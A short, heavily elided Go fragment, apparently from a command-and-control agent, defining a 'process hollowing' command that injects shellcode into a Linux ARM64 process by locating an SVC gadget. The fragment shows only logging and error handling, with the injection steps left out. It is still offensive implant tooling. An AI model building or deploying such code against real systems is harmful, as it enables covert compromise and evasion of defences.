...
func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
	...
	output, err := performHollowingLinuxArm64(shellcode, params)
	if err != nil {
...
func performHollowingLinuxArm64(shellcode []byte, params hollowParams) (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] Process Hollowing (Linux ARM64)\n")
	...
	if err != nil {
		_ = cmd.Process.Kill()
		return sb.String(), fmt.Errorf("find SVC gadget: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] SVC gadget at 0x%X\n", svcAddr))
